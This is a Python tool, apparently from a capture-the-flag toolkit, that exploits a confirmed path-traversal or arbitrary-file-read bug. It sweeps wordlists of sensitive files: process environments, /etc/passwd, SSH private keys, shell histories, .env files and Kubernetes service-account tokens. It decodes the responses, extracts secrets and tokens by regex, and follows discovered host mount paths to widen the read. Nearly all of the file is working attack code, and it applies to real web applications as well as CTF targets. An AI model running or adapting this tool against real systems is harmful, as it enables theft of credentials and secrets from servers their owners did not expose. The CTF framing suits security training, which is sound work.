#!/usr/bin/env python3
"""Drive a PROVEN arbitrary-file-read over a wordlist of high-value paths.

This tool does not find a read primitive; it exploits one you already confirmed.
Give it a request template with a `{path}` placeholder and it walks a built-in
wordlist, classifies each response against a baseline taken from a path that
cannot exist, decodes the body, and pulls out the strings that decide the next
step (absolute host paths, environment values, secrets, flag shapes).

Why /proc/self/mountinfo is first in the list: it names every host path
bind-mounted into the container, so it converts "I can read files" into "I know
which files are worth reading" in one request — including the real path of a
flag mounted in from outside the image.

    # a path traversal in a query parameter
    python3 tools/web/read_loop.py --url 'http://t/download?file=../../{path}'

    # a POST body, and follow what mountinfo reveals
    python3 tools/web/read_loop.py --url http://t/api/read --method POST \\
        --body '{"path":"{path}"}' --header 'Content-Type: application/json' \\
        --profile container --extract-paths

    # one path, printed raw, so it can be piped
    python3 tools/web/read_loop.py --url 'http://t/?f={path}' --path /etc/passwd --raw
"""
import argparse
import base64
import binascii
import json
import os
import re
import sys
import tempfile
import time
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import httpkit  # noqa: E402

# A challenge that returns a PDF turns a file read into an unreadable blob. The
# sibling module does the extraction; it is optional, so a missing one degrades
# to the raw bytes and says so in the JSON instead of raising.
try:
    import pdf_text  # noqa: E402
    PDF_TEXT_ERROR = None
except Exception as _exc:                       # missing file, syntax error
    pdf_text = None
    PDF_TEXT_ERROR = "%s: %s" % (type(_exc).__name__, _exc)

# ------------------------------------------------------------------ wordlist

CONTAINER = [
    # mountinfo first: it names the host paths bind-mounted into this container,
    # which is how a blind read becomes a targeted one.
    "/proc/self/mountinfo",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/cwd/app.py",
    "/proc/self/maps",
    "/proc/self/status",
    "/proc/self/fd/0",
    "/proc/1/cmdline",
    "/proc/1/environ",
    "/proc/mounts",
    "/proc/net/tcp",
    "/proc/net/unix",
    "/proc/version",
    "/etc/hostname",
    "/etc/hosts",
    "/etc/passwd",
    "/etc/os-release",
    "/etc/resolv.conf",
    "/.dockerenv",
]

APP_SOURCE = [
    "/proc/self/cwd/app.py", "/proc/self/cwd/main.py", "/proc/self/cwd/server.py",
    "/proc/self/cwd/wsgi.py", "/proc/self/cwd/index.js", "/proc/self/cwd/server.js",
    "/proc/self/cwd/app.js", "/proc/self/cwd/main.go", "/proc/self/cwd/index.php",
    "/app/app.py", "/app/main.py", "/app/server.py", "/app/wsgi.py",
    "/app/index.js", "/app/server.js", "/app/app.js", "/app/src/index.js",
    "/app/src/app.js", "/app/src/server.js", "/app/index.php",
    "/usr/src/app/index.js", "/usr/src/app/app.py", "/usr/src/app/server.js",
    "/var/www/html/index.php", "/var/www/html/config.php",
    "/srv/app/app.py", "/opt/app/app.py",
]

CONFIG = [
    "/app/.env", "/app/config.json", "/app/config.py", "/app/settings.py",
    "/app/config/config.json", "/app/docker-compose.yml", "/app/Dockerfile",
    "/app/requirements.txt", "/app/package.json", "/app/package-lock.json",
    "/app/yarn.lock", "/app/pnpm-lock.yaml", "/app/go.mod", "/app/go.sum",
    "/app/Gemfile.lock", "/app/composer.json", "/app/composer.lock",
    "/app/Cargo.toml", "/app/Cargo.lock", "/app/tsconfig.json",
    "/proc/self/cwd/.env", "/proc/self/cwd/package.json",
    "/proc/self/cwd/requirements.txt", "/proc/self/cwd/Dockerfile",
    "/var/www/html/.env", "/usr/src/app/.env", "/usr/src/app/package.json",
    "/etc/nginx/nginx.conf", "/etc/nginx/conf.d/default.conf",
    "/etc/haproxy/haproxy.cfg", "/etc/apache2/apache2.conf",
    "/etc/supervisor/conf.d/supervisord.conf", "/etc/crontab",
]

FLAGS = [
    "/flag", "/flag.txt", "/flag/flag.txt", "/flag_", "/app/flag",
    "/app/flag.txt", "/root/flag", "/root/flag.txt", "/home/ctf/flag.txt",
    "/tmp/flag.txt", "/var/flag", "/flag.py", "/secret/flag",
    "/proc/self/cwd/flag", "/proc/self/cwd/flag.txt",
]

SECRETS = [
    "/root/.bash_history", "/root/.ssh/id_rsa", "/home/ctf/.bash_history",
    "/app/.git/HEAD", "/app/.git/config", "/proc/self/cwd/.git/HEAD",
    "/app/.git/logs/HEAD", "/var/log/nginx/access.log",
    "/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
]

PROFILES = {
    "container": CONTAINER,
    "source": APP_SOURCE,
    "config": CONFIG,
    "flags": FLAGS,
    "secrets": SECRETS,
}
PROFILES["quick"] = CONTAINER[:6] + FLAGS[:4] + ["/app/.env"]
PROFILES["all"] = list(dict.fromkeys(
    CONTAINER + APP_SOURCE + CONFIG + FLAGS + SECRETS))

NONEXISTENT = "/etc/ctf-v2-baseline-does-not-exist-%d" % os.getpid()

# ------------------------------------------------------------------ decoding

DECODERS = ("none", "base64", "hex", "url", "auto")


def decode_body(text, how="auto"):
    """-> (decoded_text, decoder_name). 'auto' only decodes on a confident shape."""
    stripped = text.strip()
    if how in ("base64", "auto") and stripped and \
            re.fullmatch(r"[A-Za-z0-9+/=\s]{16,}", stripped):
        try:
            raw = base64.b64decode(stripped + "=" * (-len(stripped.strip()) % 4),
                                   validate=False)
            guess = raw.decode("utf-8", "replace")
            if how == "base64" or guess.count("�") < len(guess) / 20:
                return guess, "base64"
        except (binascii.Error, ValueError):
            pass
    if how in ("hex", "auto") and stripped and \
            re.fullmatch(r"(?:[0-9a-fA-F]{2}\s*){8,}", stripped):
        try:
            return binascii.unhexlify(re.sub(r"\s", "", stripped)).decode(
                "utf-8", "replace"), "hex"
        except binascii.Error:
            pass
    if how == "url":
        return urllib.parse.unquote(text), "url"
    if how == "base64":
        return text, "base64-failed"
    return text, "none"


def looks_like_pdf(data):
    if isinstance(data, str):
        data = data.encode("utf-8", "surrogateescape")
    return data[:5] == b"%PDF-" or data[:1024].lstrip()[:5] == b"%PDF-"


def decode_pdf(data):
    """bytes -> (text, decoder_name). Never raises; reports a missing engine.

    pdf_text exposes its engines as EXTRACTORS/ORDER, which take bytes. Its
    top-level extract() takes a path or a URL instead, so the bytes already in
    hand go through a temporary file in that fallback rather than being fetched
    a second time.
    """
    if isinstance(data, str):
        data = data.encode("utf-8", "surrogateescape")
    if pdf_text is None:
        return "", "pdf-unavailable (%s)" % PDF_TEXT_ERROR
    engines = getattr(pdf_text, "EXTRACTORS", None)
    order = getattr(pdf_text, "ORDER", None)
    if isinstance(engines, dict) and order:
        tried = []
        for name in order:
            runner = engines.get(name)
            if not runner:
                continue
            try:
                got = runner(data)
            except Exception as exc:
                tried.append("%s:%s" % (name, type(exc).__name__))
                continue
            text = got.get("text") or ""
            if got.get("ok") and text.strip():
                return text, "pdf:%s" % name
            tried.append("%s:%s" % (name, got.get("reason") or "empty"))
        return "", "pdf-empty (%s)" % ", ".join(tried)
    extract = getattr(pdf_text, "extract", None)
    if not extract:
        return "", "pdf-unavailable (pdf_text exposes no extractor)"
    handle = None
    try:
        handle = tempfile.NamedTemporaryFile(prefix="read-loop-", suffix=".pdf",
                                             delete=False)
        handle.write(data)
        handle.close()
        got = extract(handle.name)
        if not isinstance(got, dict):
            return "", "pdf-failed (unexpected extract() return)"
        return got.get("text") or "", "pdf:%s" % (got.get("extractor")
                                                  or got.get("engine") or "unknown")
    except Exception as exc:
        return "", "pdf-failed (%s: %s)" % (type(exc).__name__, exc)
    finally:
        if handle is not None:
            try:
                os.unlink(handle.name)
            except OSError:
                pass


# /proc/self/environ and cmdline are NUL-separated, not newline-separated.
def normalise_nul(text):
    return text.replace("\x00", "\n") if text.count("\x00") > 1 else text


MOUNT_RX = re.compile(r"^\d+\s+\d+\s+\S+\s+(\S+)\s+(\S+)\s", re.M)
INTERESTING = {
    "flag_shape": re.compile(r"[A-Za-z0-9_]{2,16}\{[^}\n]{3,120}\}"),
    "absolute_paths": re.compile(r"(?<![\w.])/(?:app|srv|opt|flag|secret|home|root|"
                                 r"usr/src|var/www)[\w./-]*"),
    "env_assignments": re.compile(r"^[A-Z][A-Z0-9_]{2,40}=[^\n]{1,200}$", re.M),
    "secretish": re.compile(r"(?i)\b(secret|token|passwd|password|api[_-]?key|"
                            r"private[_-]?key|session[_-]?key|jwt)\b[^\n]{0,120}"),
    "urls": re.compile(r"(?:https?|redis|mongodb|postgres|mysql|amqp)://[^\s\"'<>]{4,160}"),
}


def harvest(text):
    """Every string in this body that decides the next read."""
    out = {}
    for name, rx in INTERESTING.items():
        found = list(dict.fromkeys(m if isinstance(m, str) else m[0]
                                   for m in rx.findall(text)))
        if found:
            out[name] = found[:40]
    mounts = [{"mount_point": mp, "source": src}
              for src, mp in MOUNT_RX.findall(text)]
    if mounts:
        out["bind_mounts"] = mounts[:60]
        out["mount_note"] = ("each 'source' is a HOST path mounted into the "
                             "container: read those next")
    return out


# ------------------------------------------------------------------ oracle


def classify(resp, baseline):
    """Existence verdict from whatever actually distinguishes the two."""
    if not resp["ok"]:
        return "transport-error", resp.get("error")
    if baseline is None:
        return ("hit" if resp["status"] and resp["status"] < 400 else "miss",
                "no baseline")
    reasons = []
    if resp["status"] != baseline["status"]:
        reasons.append("status %s vs baseline %s" % (resp["status"], baseline["status"]))
    if resp["body"] == baseline["body"]:
        return "miss", "body identical to the non-existent-path baseline"
    if abs(resp["length"] - baseline["length"]) > 2:
        reasons.append("length %d vs baseline %d" % (resp["length"], baseline["length"]))
    if not reasons:
        return "ambiguous", "differs from baseline only in body content"
    return ("hit" if (resp["status"] or 0) < 400 or resp["length"] > baseline["length"]
            else "differs"), "; ".join(reasons)


def read_one(url, path, method="GET", headers=None, body=None, encode="none",
             timeout=10, insecure=True):
    value = urllib.parse.quote(path, safe="") if encode == "url" else path
    if encode == "double-url":
        value = urllib.parse.quote(urllib.parse.quote(path, safe=""), safe="")
    target = httpkit.fill(url, path=value)
    payload = httpkit.fill(body, path=value) if body else None
    hdrs = {k: httpkit.fill(v, path=value) for k, v in (headers or {}).items()}
    return httpkit.request(target, method, hdrs, payload, timeout=timeout,
                           insecure=insecure)


def main(argv=None):
    parser = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    parser.add_argument("--url", required=True,
                        metavar="URL_WITH_{path}",
                        help="request template; {path} may sit in the URL, the "
                             "body or a header")
    parser.add_argument("--method", default="GET")
    parser.add_argument("--header", action="append", default=[], metavar="K: V")
    parser.add_argument("--body", metavar="BODY_WITH_{path}")
    parser.add_argument("--encode", default="none",
                        choices=("none", "url", "double-url"))
    parser.add_argument("--profile", default="quick",
                        choices=sorted(PROFILES),
                        help="built-in wordlist to sweep (default: quick)")
    parser.add_argument("--path", action="append", default=[],
                        help="read exactly this path instead of a profile (repeatable)")
    parser.add_argument("--wordlist", help="file of paths, one per line")
    parser.add_argument("--decode", default="auto", choices=DECODERS)
    parser.add_argument("--extract", metavar="REGEX",
                        help="pull the file content out of a JSON or HTML wrapper; "
                             "group 1 if the regex has one")
    parser.add_argument("--extract-paths", action="store_true",
                        help="feed every absolute path found in a hit back into the "
                             "sweep (one extra round)")
    parser.add_argument("--grep", action="append", default=[], metavar="REGEX")
    parser.add_argument("--no-baseline", action="store_true",
                        help="skip the non-existent-path baseline request")
    parser.add_argument("--delay", type=float, default=0.0)
    parser.add_argument("--timeout", type=float, default=10)
    parser.add_argument("--max-chars", type=int, default=2000,
                        help="content kept per hit in the JSON report")
    parser.add_argument("--raw", action="store_true",
                        help="print the decoded content of the single --path only")
    parser.add_argument("--out", metavar="FILE", help="write full content per hit")
    parser.add_argument("--compact", action="store_true")
    args = parser.parse_args(argv)

    if "{path}" not in (args.url + (args.body or "") + "".join(args.header)):
        httpkit.jprint({"mode": "read-loop", "ok": False,
                        "error": "no {path} placeholder in --url, --body or --header"},
                       args.compact)
        return 2

    headers = httpkit.parse_headers(args.header)
    if args.wordlist:
        try:
            with open(args.wordlist, encoding="utf-8", errors="replace") as handle:
                paths = [l.strip() for l in handle if l.strip()
                         and not l.startswith("#")]
        except OSError as exc:
            httpkit.jprint({"mode": "read-loop", "ok": False, "error": str(exc)},
                           args.compact)
            return 2
    elif args.path:
        paths = list(args.path)
    else:
        paths = list(PROFILES[args.profile])

    extract_rx = re.compile(args.extract, re.S) if args.extract else None

    def content_of(resp):
        """-> (text, decoder). An empty text with a non-empty body means the
        --extract regex did not match: say so instead of reporting an empty hit."""
        raw = resp.get("body_bytes") or b""
        if looks_like_pdf(raw):
            text, how = decode_pdf(raw)
            return normalise_nul(text), how
        text = resp["body"]
        if extract_rx:
            match = extract_rx.search(text)
            text = (match.group(1) if match and match.groups()
                    else match.group(0)) if match else ""
            # a JSON-wrapped file still carries \n, \t, \u0000 as literals
            if re.search(r'\\[nrtu/"\\]', text):
                try:
                    text = json.loads('"%s"' % text.replace('"', '\\"'))
                except ValueError:
                    text = text.encode("latin-1", "replace").decode(
                        "unicode_escape", "replace")
        decoded, how = decode_body(text, args.decode)
        return normalise_nul(decoded), how

    baseline = None
    if not args.no_baseline:
        probe = read_one(args.url, NONEXISTENT, args.method, headers, args.body,
                         args.encode, args.timeout)
        if probe["ok"]:
            baseline = {"status": probe["status"], "length": probe["length"],
                        "body": probe["body"]}

    results, seen = [], set()
    queue = list(paths)
    rounds = 0
    started = time.monotonic()
    while queue:
        path = queue.pop(0)
        if path in seen:
            continue
        seen.add(path)
        resp = read_one(args.url, path, args.method, headers, args.body,
                        args.encode, args.timeout)
        verdict, why = classify(resp, baseline)
        text, how = content_of(resp) if resp["ok"] else ("", "none")
        entry = {"path": path, "verdict": verdict, "why": why,
                 "status": resp.get("status"), "length": resp.get("length"),
                 "decoder": how, "chars": len(text)}
        if resp.get("error"):
            entry["error"] = resp["error"]
        if extract_rx and resp.get("body") and not text.strip():
            entry["extract_missed"] = ("--extract matched nothing; the body is "
                                       "non-empty, so the wrapper regex is wrong")
        if verdict == "hit" and text.strip():
            entry["findings"] = harvest(text)
            entry["content"] = text[:args.max_chars]
            entry["content_truncated"] = len(text) > args.max_chars
            entry["_full"] = text
            if args.extract_paths and rounds == 0:
                for found in entry["findings"].get("absolute_paths", [])[:20]:
                    if found not in seen:
                        queue.append(found)
                for mount in entry["findings"].get("bind_mounts", [])[:20]:
                    src = mount["source"]
                    if src.startswith("/") and src not in seen:
                        queue.append(src)
        if args.grep and text:
            entry["grep"] = []
            for pattern in args.grep:
                try:
                    found = re.findall(pattern, text, re.S)
                except re.error as exc:
                    entry["grep"].append({"pattern": pattern, "error": str(exc)})
                    continue
                entry["grep"].append({"pattern": pattern, "count": len(found),
                                      "matches": [f if isinstance(f, str) else list(f)
                                                  for f in found[:10]]})
        results.append(entry)
        if args.delay:
            time.sleep(args.delay)
        if not queue:
            rounds += 1

    if args.raw:
        for entry in results:
            if entry.get("_full"):
                sys.stdout.write(entry["_full"])
        return 0 if any(e.get("_full") for e in results) else 1

    if args.out:
        with open(args.out, "w", encoding="utf-8") as handle:
            json.dump(results, handle, ensure_ascii=False, indent=2, default=str)
    for entry in results:
        entry.pop("_full", None)

    hits = [e for e in results if e["verdict"] == "hit"]
    next_paths = sorted({p for e in hits
                         for p in e.get("findings", {}).get("absolute_paths", [])
                         if p not in seen})
    report = {
        "mode": "read-loop", "ok": True,
        "target": {"url": args.url, "method": args.method.upper(),
                   "placeholder_encode": args.encode},
        "baseline": None if baseline is None else
                    {"path": NONEXISTENT, "status": baseline["status"],
                     "length": baseline["length"]},
        "tried": len(results), "hits": len(hits),
        "verdict_line": "%d of %d paths read" % (len(hits), len(results)),
        "elapsed": round(time.monotonic() - started, 3),
        "results": results,
        "suggested_next_paths": next_paths[:40],
        "evidence_note": ("a hit is only a read; quote the decoded excerpt into "
                          "tools/hooks.py post-probe --evidence to record it"),
    }
    if args.out:
        report["out"] = os.path.abspath(args.out)
    if not baseline:
        report["caution"] = ("no baseline: 'hit' here means status < 400 only, "
                             "which a soft-404 will satisfy")
    httpkit.jprint(report, args.compact)
    return 0 if hits else 1


if __name__ == "__main__":
    sys.exit(main())
